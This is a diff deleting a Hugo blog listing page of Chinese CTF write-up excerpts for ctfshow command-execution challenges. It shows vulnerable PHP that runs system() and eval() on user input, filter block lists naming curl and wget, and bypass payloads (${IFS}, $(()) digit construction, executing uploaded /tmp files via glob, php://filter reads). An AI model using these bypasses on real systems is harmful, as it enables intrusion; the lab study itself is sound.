@@ -1,400 +1,0 @@
-<!DOCTYPE html>
-<html lang="en" dir="auto">
-
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="noindex, nofollow">
-<title>Web入门 | My New Hugo Site</title>
-<meta name="keywords" content="">
-<meta name="description" content="">
-<meta name="author" content="">
-<link rel="canonical" href="http://localhost:1313/categories/web%E5%85%A5%E9%97%A8/">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.36819bea596090d8b48cf10d9831382996197aa7e4fc86f792f7c08c9ca4d23b.css" integrity="sha256-NoGb6llgkNi0jPENmDE4KZYZeqfk/Ib3kvfAjJyk0js=" rel="preload stylesheet" as="style">
-<link rel="icon" href="http://localhost:1313/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
-<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
-<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
-<meta name="theme-color" content="#2e2e33">
-<meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" type="application/rss+xml" href="http://localhost:1313/categories/web%E5%85%A5%E9%97%A8/index.xml">
-<link rel="alternate" hreflang="en" href="http://localhost:1313/categories/web%E5%85%A5%E9%97%A8/">
-<noscript>
-    <style>
-        #theme-toggle,
-        .top-link {
-            display: none;
-        }
-
-    </style>
-    <style>
-        @media (prefers-color-scheme: dark) {
-            :root {
-                --theme: rgb(29, 30, 32);
-                --entry: rgb(46, 46, 51);
-                --primary: rgb(218, 218, 219);
-                --secondary: rgb(155, 156, 157);
-                --tertiary: rgb(65, 66, 68);
-                --content: rgb(196, 196, 197);
-                --code-block-bg: rgb(46, 46, 51);
-                --code-bg: rgb(55, 56, 62);
-                --border: rgb(51, 51, 51);
-            }
-
-            .list {
-                background: var(--theme);
-            }
-
-            .list:not(.dark)::-webkit-scrollbar-track {
-                background: 0 0;
-            }
-
-            .list:not(.dark)::-webkit-scrollbar-thumb {
-                border-color: var(--theme);
-            }
-        }
-
-    </style>
-</noscript>
-</head>
-
-<body class="list" id="top">
-<script>
-    if (localStorage.getItem("pref-theme") === "dark") {
-        document.body.classList.add('dark');
-    } else if (localStorage.getItem("pref-theme") === "light") {
-        document.body.classList.remove('dark')
-    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
-        document.body.classList.add('dark');
-    }
-
-</script>
-
-<header class="header">
-    <nav class="nav">
-        <div class="logo">
-            <a href="http://localhost:1313/" accesskey="h" title="My New Hugo Site (Alt + H)">My New Hugo Site</a>
-            <div class="logo-switches">
-                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
-                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
-                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
-                        stroke-linejoin="round">
-                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
-                    </svg>
-                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
-                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
-                        stroke-linejoin="round">
-                        <circle cx="12" cy="12" r="5"></circle>
-                        <line x1="12" y1="1" x2="12" y2="3"></line>
-                        <line x1="12" y1="21" x2="12" y2="23"></line>
-                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
-                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
-                        <line x1="1" y1="12" x2="3" y2="12"></line>
-                        <line x1="21" y1="12" x2="23" y2="12"></line>
-                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
-                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
-                    </svg>
-                </button>
-            </div>
-        </div>
-        <ul id="menu">
-        </ul>
-    </nav>
-</header>
-<main class="main"> 
-<header class="page-header">
-  <h1>
-    Web入门
-  </h1>
-</header>
-
-<article class="post-entry tag-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">Web56
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>
-[!IMPORTANT]
-linux文件上传,.读取，glob正则
-0x01 访问靶场，回显源码
-&lt;?php/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 22:02:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/// 你们在炫技吗？if(isset($_GET[&#39;c&#39;])){$c=$_GET[&#39;c&#39;];if(!preg_match(&#34;/\;|[a-z]|[0-9]|\\$|\(|\{|\&#39;|\&#34;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&#34;, $c)){system($c);}}else{highlight_file(__FILE__);} 0x02 [!NOTe]
-源码审计
-过滤字段新增&#34;&#34; &#39;及[0-9]
-Web55base64及biz2方法无法使用，使用.读取post传参文件方法不再赘述
-0x03 上传payloda获得flag
-</p>
-  </div>
-  <footer class="entry-footer"><span title='2025-03-13 00:00:00 +0000 UTC'>March 13, 2025</span>&nbsp;·&nbsp;AuranLu</footer>
-  <a class="entry-link" aria-label="post link to Web56" href="http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web56/"></a>
-</article>
-
-<article class="post-entry tag-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">Web57
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>
-[!IMPORTANT]
-$(())=0构造
-0x01 访问靶场，回显源码
-&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-08 01:02:56# @email: h1xa@ctfer.com# @link: https://ctfer.com*/// 还能炫的动吗？//flag in 36.phpif(isset($_GET[&#39;c&#39;])){$c=$_GET[&#39;c&#39;];if(!preg_match(&#34;/\;|[a-z]|[0-9]|\`|\|\#|\&#39;|\&#34;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&#34;, $c)){system(&#34;cat &#34;.$c.&#34;.php&#34;);}}else{highlight_file(__FILE__);} 0x02 [!NOTE]
-源码审计
-由注释可得flag位于36.php中
-preg_match过滤字段新增大量通配符,无法模糊匹配
-sytem直接运行cat $c.php
-构造payload思路:
-linux有(())进行整数运算,内部可以放置表达式，默认相加。
-此时有$(())=0 $((~ $(()) ))=-1
-35的构造payload如下
-$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))) 0x03 提交payload，获得flag
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2025-03-13 00:00:00 +0000 UTC'>March 13, 2025</span>&nbsp;·&nbsp;AuranLu</footer>
-  <a class="entry-link" aria-label="post link to Web57" href="http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web57/"></a>
-</article>
-
-<article class="post-entry tag-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">Web58
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>
-[!IMPORTANT]
-POST方法修改，system函数禁用绕过
-0x01 访问靶场，回显源码
-&lt;?php/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 22:02:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/// 你们在炫技吗？if(isset($_POST[&#39;c&#39;])){$c= $_POST[&#39;c&#39;];eval($c);}else{highlight_file(__FILE__);} 0x02 [!NOTE]
-源码审计
-此题使用post传参并执行
-构造payload思路：
-猜测此题无过滤，使用post直接传参命令执行
-0x03 传参提交后发现此题system命令被禁用
-尝试使用print_r(scandir(&#39;./&#39;))查看当前目录(glob()也可使用)
-include函数&#43;伪协议构造payload查看flag.php
-php://filter/read=convert.base64-encode/resource=flag.php base64解码后获得flag
-</p>
-  </div>
-  <footer class="entry-footer"><span title='2025-03-13 00:00:00 +0000 UTC'>March 13, 2025</span>&nbsp;·&nbsp;AuranLu</footer>
-  <a class="entry-link" aria-label="post link to Web58" href="http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web58/"></a>
-</article>
-
-<article class="post-entry tag-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">Web59
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>
-[!IMPORTANT]
-POST方法修改，system函数禁用绕过
-0x01 访问靶场，回显源码
-&lt;?php/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 22:02:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/// 你们在炫技吗？if(isset($_POST[&#39;c&#39;])){$c= $_POST[&#39;c&#39;];eval($c);}else{highlight_file(__FILE__);} 0x02 审计后猜测与Web58类似
-0x03 实际尝试后与Web58雷同，不再赘述
-</p>
-  </div>
-  <footer class="entry-footer"><span title='2025-03-13 00:00:00 +0000 UTC'>March 13, 2025</span>&nbsp;·&nbsp;AuranLu</footer>
-  <a class="entry-link" aria-label="post link to Web59" href="http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web59/"></a>
-</article>
-
-<article class="post-entry tag-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">Web60
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>
-[!IMPORTANT]
-0x01 访问靶场，回显源码
-&lt;?php/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 22:02:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/// 你们在炫技吗？if(isset($_POST[&#39;c&#39;])){$c= $_POST[&#39;c&#39;];eval($c);}else{highlight_file(__FILE__);} 0x02 猜测与Web58类似
-0x03 实际操作雷同
-</p>
-  </div>
-  <footer class="entry-footer"><span title='2025-03-13 00:00:00 +0000 UTC'>March 13, 2025</span>&nbsp;·&nbsp;AuranLu</footer>
-  <a class="entry-link" aria-label="post link to Web60" href="http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web60/"></a>
-</article>
-
-<article class="post-entry tag-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">Web52
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>
-[!IMPORTANT]
-preg_match过滤绕过及RCE重定向截断
-0x01 访问靶场，回显源码
-&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-05 22:50:30# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#39;c&#39;])){$c=$_GET[&#39;c&#39;];if(!preg_match(&#34;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&#34;, $c)){system($c.&#34; &gt;/dev/null 2&gt;&amp;1&#34;);}}else{highlight_file(__FILE__);} 0x02 [!NOTE]
-审计源码
-过滤字段新增&gt; &lt;
-标准输出被重定向
-构造payload思路：使用${IFS}替代&gt;以替代空格，使用||进行截断
-0x03 目录扫描过程此处不再赘述
-提交payload，获得flag
-</p>
-  </div>
-  <footer class="entry-footer"><span title='2025-03-11 00:00:00 +0000 UTC'>March 11, 2025</span>&nbsp;·&nbsp;AuranLu</footer>
-  <a class="entry-link" aria-label="post link to Web52" href="http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web52/"></a>
-</article>
-
-<article class="post-entry tag-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">Web53
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>
-[!IMPORTANT]
-preg_match过滤绕过
-0x01 访问靶场，回显源码
-&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 18:21:02# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#39;c&#39;])){$c=$_GET[&#39;c&#39;];if(!preg_match(&#34;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&#34;, $c)){echo($c);$d = system($c);echo &#34;&lt;br&gt;&#34;.$d;}else{echo &#39;no&#39;;}}else{highlight_file(__FILE__);} 0x02 [!NOTE]
-代码审计
-过滤字段无新增
-构造payload时仅需考虑绕过preg_match即可
-0x03 </p>
-  </div>
-  <footer class="entry-footer"><span title='2025-03-11 00:00:00 +0000 UTC'>March 11, 2025</span>&nbsp;·&nbsp;AuranLu</footer>
-  <a class="entry-link" aria-label="post link to Web53" href="http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web53/"></a>
-</article>
-
-<article class="post-entry tag-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">Web54
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>
-[!IMPORTANT]
-preg_match过滤
-0x01 访问靶场，回显源码
-&lt;?php/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 19:43:42# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#39;c&#39;])){$c=$_GET[&#39;c&#39;];if(!preg_match(&#34;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&#34;, $c)){system($c);}}else{highlight_file(__FILE__);} 0x02 [!NOTE]
-代码审计
-按顺序过滤字段，无法再使用字符拼接
-被过滤命令包括cat flag more wget less head sort tail sed cut tac awk strings od curl nl scp rm
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2025-03-11 00:00:00 +0000 UTC'>March 11, 2025</span>&nbsp;·&nbsp;AuranLu</footer>
-  <a class="entry-link" aria-label="post link to Web54" href="http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web54/"></a>
-</article>
-
-<article class="post-entry tag-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">Web55
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>
-[!IMPORTANT]
-linux文件上传,.读取，glob正则
-0x01 访问靶场，回显源码
-&lt;?php/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 20:03:51# @email: h1xa@ctfer.com# @link: https://ctfer.com*/// 你们在炫技吗？if(isset($_GET[&#39;c&#39;])){$c=$_GET[&#39;c&#39;];if(!preg_match(&#34;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&#34;, $c)){system($c);}}else{highlight_file(__FILE__);} 0x02 [!NOTE]
-代码审计
-过滤字段新增字母大小写过滤
-构造payload思路： 过滤字段无数字，尝试使用纯通配符匹配/bin/base64 flag.php 过滤字段无数字，尝试使用纯通配符匹配/bin/bzip2 flag.php以压缩flag.php进行下载 无数字RCE构造,此题未过滤.。而在linux中,.可以执行一个文件中的命令，比如.file就是执行file文件中的命令。所以本题可以==post上传一个包含命令==的文件，然后通过.来执行文件中的命令即可读到flag。 在linux中，被post上传的文件通常位于/tmp/phpXXXXXX目录下（后六位为随机生成的字母）。故可以使用通配符/???/?????????匹配。 通常情况下，tmp的类似文件名的文件有多个，与正则表达式类似，glob支持利用[0-9]来表示一个范围，所以我们可以用[A-Z]来匹配文件的最后一位，但因为过滤了字母，需要把A改为A的前一位@，把Z改为Z的后一位[来匹配大写字母。 0x03 命令执行POC（也可使用hackbar）
-&lt;!DOCTYPE html&gt;&lt;html lang=&#34;en&#34;&gt;&lt;head&gt;&lt;meta charset=&#34;UTF-8&#34;&gt;&lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt;&lt;title&gt;POST数据包POC&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&#34;http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/&#34; method=&#34;post&#34; enctype=&#34;multipart/form-data&#34;&gt;&lt;!--链接是当前打开的题目链接--&gt;&lt;label for=&#34;file&#34;&gt;文件名：&lt;/label&gt;&lt;input type=&#34;file&#34; name=&#34;file&#34; id=&#34;file&#34;&gt;&lt;br&gt;&lt;input type=&#34;submit&#34; name=&#34;submit&#34; value=&#34;提交&#34;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 在POST头加入传参以执行文件post提交的文件内包含的命令
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2025-03-11 00:00:00 +0000 UTC'>March 11, 2025</span>&nbsp;·&nbsp;AuranLu</footer>
-  <a class="entry-link" aria-label="post link to Web55" href="http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web55/"></a>
-</article>
-
-<article class="post-entry tag-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">Web01
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>
-题目提示：开发注释未及时删除
-1.连接至题目所给靶场
-2.尝试查看源代码，发现flag
-</p>
-  </div>
-  <footer class="entry-footer"><span title='2025-03-10 00:00:00 +0000 UTC'>March 10, 2025</span>&nbsp;·&nbsp;AuranLu</footer>
-  <a class="entry-link" aria-label="post link to Web01" href="http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/web01/"></a>
-</article>
-<footer class="page-footer">
-  <nav class="pagination">
-    <a class="prev" href="http://localhost:1313/categories/web%E5%85%A5%E9%97%A8/">
-      «&nbsp;Prev&nbsp;
-    </a>
-    <a class="next" href="http://localhost:1313/categories/web%E5%85%A5%E9%97%A8/page/3/">Next&nbsp;&nbsp;»
-    </a>
-  </nav>
-</footer>
-    </main>
-    
-<footer class="footer">
-        <span>&copy; 2025 <a href="http://localhost:1313/">My New Hugo Site</a></span> · 
-
-    <span>
-        Powered by
-        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
-        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
-    </span>
-</footer>
-<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
-        <path d="M12 6H0l6-6z" />
-    </svg>
-</a>
-
-<script>
-    let menu = document.getElementById('menu')
-    if (menu) {
-        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
-        menu.onscroll = function () {
-            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
-        }
-    }
-
-    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-        anchor.addEventListener("click", function (e) {
-            e.preventDefault();
-            var id = this.getAttribute("href").substr(1);
-            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
-                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
-                    behavior: "smooth"
-                });
-            } else {
-                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
-            }
-            if (id === "top") {
-                history.replaceState(null, null, " ");
-            } else {
-                history.pushState(null, null, `#${id}`);
-            }
-        });
-    });
-
-</script>
-<script>
-    var mybutton = document.getElementById("top-link");
-    window.onscroll = function () {
-        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
-            mybutton.style.visibility = "visible";
-            mybutton.style.opacity = "1";
-        } else {
-            mybutton.style.visibility = "hidden";
-            mybutton.style.opacity = "0";
-        }
-    };
-
-</script>
-<script>
-    document.getElementById("theme-toggle").addEventListener("click", () => {
-        if (document.body.className.includes("dark")) {
-            document.body.classList.remove('dark');
-            localStorage.setItem("pref-theme", 'light');
-        } else {
-            document.body.classList.add('dark');
-            localStorage.setItem("pref-theme", 'dark');
-        }
-    })
-
-</script>
-</body>
-
-</html>
